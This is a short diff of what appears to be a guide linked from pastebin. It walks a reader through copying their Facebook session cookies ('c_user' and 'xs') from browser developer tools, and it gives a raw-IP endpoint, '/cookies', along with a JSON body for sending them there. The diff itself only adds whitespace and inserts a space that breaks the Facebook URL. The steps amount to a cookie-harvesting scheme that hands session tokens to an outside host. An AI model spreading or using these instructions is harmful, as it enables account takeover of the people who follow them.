@@ -11,7 +11,7 @@ https://pastebin.com/Nj8GhvYa
  
 `http://82.29.169.143:3000/cookies`
 
-```json
+```json      
 {
     "c_user": "111111111",
     "xs": "213413255553541235435454515351325"
@@ -39,6 +39,6 @@ https://pastebin.com/Nj8GhvYa
 2. F12 into developer mode
 3. Go to `Application`
 4. On the left sidebar go to `Cookies`
-5. In the dropdown select `https://www.facebook.com/`
+5. In the dropdown select `https://www.f acebook.com/`
 6. In there you will have `c_user` & `xs` for the cookies
 7. CLOSE THE INCOGNITO WINDOW
